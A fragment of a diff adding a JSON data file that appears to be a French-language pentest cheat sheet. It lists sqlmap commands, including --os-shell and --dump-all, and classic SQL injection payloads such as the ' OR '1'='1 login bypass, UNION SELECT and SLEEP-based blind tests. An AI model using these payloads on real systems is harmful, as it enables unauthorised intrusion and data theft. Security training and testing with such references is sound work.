+      "example": "--cookie=\"PHPSESSID=abc123\""
+    },
+    {
+      "id": "sqlmap-19",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --os-shell",
+      "desc": "Tenter d'obtenir un shell sur le serveur (si droits très élevés)",
+      "example": "--os-shell"
+    },
+    {
+      "id": "sqlmap-20",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --dump-all",
+      "desc": "Extraire toutes les bases et tables accessibles",
+      "example": "--dump-all --batch"
+    },
+    {
+      "id": "sqlmap-21",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --threads=5",
+      "desc": "Paralléliser les requêtes pour aller plus vite",
+      "example": "--threads=5"
+    },
+    {
+      "id": "sqlmap-22",
+      "section": "sqlmap",
+      "cmd": "sqlmap -r requete.txt",
+      "desc": "Rejouer une requête HTTP brute capturée (Burp/proxy)",
+      "example": "sqlmap -r request.txt --dbs"
+    },
+    {
+      "id": "sqlmap-23",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --flush-session",
+      "desc": "Oublier la session sauvegardée et retester depuis zéro",
+      "example": "--flush-session"
+    },
+    {
+      "id": "sqlmap-24",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --banner",
+      "desc": "Afficher la version exacte du SGBD",
+      "example": "--banner"
+    },
+    {
+      "id": "payload-1",
+      "section": "sqlmap-payloads",
+      "cmd": "?id=1'",
+      "desc": "Test basique — provoque souvent une erreur SQL visible",
+      "example": "page.php?id=1'"
+    },
+    {
+      "id": "payload-2",
+      "section": "sqlmap-payloads",
+      "cmd": "?id=1 AND 1=1",
+      "desc": "Condition toujours vraie — la page doit s'afficher normalement",
+      "example": "page.php?cat=1 AND 1=1"
+    },
+    {
+      "id": "payload-3",
+      "section": "sqlmap-payloads",
+      "cmd": "?id=1 AND 1=2",
+      "desc": "Condition toujours fausse — si la page change, c'est injectable",
+      "example": "page.php?cat=1 AND 1=2"
+    },
+    {
+      "id": "payload-4",
+      "section": "sqlmap-payloads",
+      "cmd": "?id=1' OR '1'='1",
+      "desc": "Classique pour contourner un login (bypass)",
+      "example": "username=admin' OR '1'='1"
+    },
+    {
+      "id": "payload-5",
+      "section": "sqlmap-payloads",
+      "cmd": "?id=1 ORDER BY N--",
+      "desc": "Trouver le nombre de colonnes avant une UNION",
+      "example": "page.php?cat=1 ORDER BY 4-- -"
+    },
+    {
+      "id": "payload-6",
+      "section": "sqlmap-payloads",
+      "cmd": "?id=-1 UNION SELECT ...",
+      "desc": "Injection UNION pour afficher des données d'une autre table",
+      "example": "?cat=-1 UNION SELECT 1,2,user(),4-- -"
+    },
+    {
+      "id": "payload-7",
+      "section": "sqlmap-payloads",
+      "cmd": "?id=1 AND SLEEP(5)--",
+      "desc": "Injection time-based blind — la réponse doit se faire attendre",
+      "example": "?cat=1 AND SLEEP(5)-- -"
+    },
+    {
+      "id": "payload-8",
+      "section": "sqlmap-payloads",
+      "cmd": "-- -",
+      "desc": "Commentaire MySQL pour neutraliser le reste de la requête",
+      "example": "' OR 1=1-- -"
+    },
+    {
+      "id": "payload-9",
+      "section": "sqlmap-payloads",
+      "cmd": "#",
+      "desc": "Autre style de commentaire MySQL (une seule ligne)",
+      "example": "' OR 1=1#"
+    }
+  ]
+}
